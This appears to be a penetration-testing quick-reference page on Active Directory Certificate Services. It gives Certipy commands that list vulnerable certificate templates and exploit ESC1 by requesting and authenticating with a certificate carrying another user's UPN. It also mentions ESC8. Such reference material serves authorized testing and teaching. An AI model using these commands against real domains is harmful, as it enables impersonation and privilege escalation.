# AD CS: template checks

[← Active Directory quick reference](../05-active-directory.md)

When AD CS is present, check enrollment services and templates with the domain account you control. A listed template needs manual review of its enrollment rights and settings before a certificate request.

```bash
certipy find -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -vulnerable -stdout
```

For ESC1, the relevant template permits the enrollee to supply a subject alternative name. Confirm that condition and enrollment permission, then request and authenticate with the selected UPN.

```bash
certipy req -u <user>@<domain.tld> -p '<password>' -dc-ip <dc-ip> -ca <CA-NAME> -template <TEMPLATE> \
  -upn <target-user>@<domain.tld>
certipy auth -pfx <issued-certificate>.pfx -dc-ip <dc-ip>
```

Certipy command names and options vary by installed version; check `certipy --help` locally. For ESC8, first confirm that HTTP enrollment and the relevant NTLM authentication path are present.
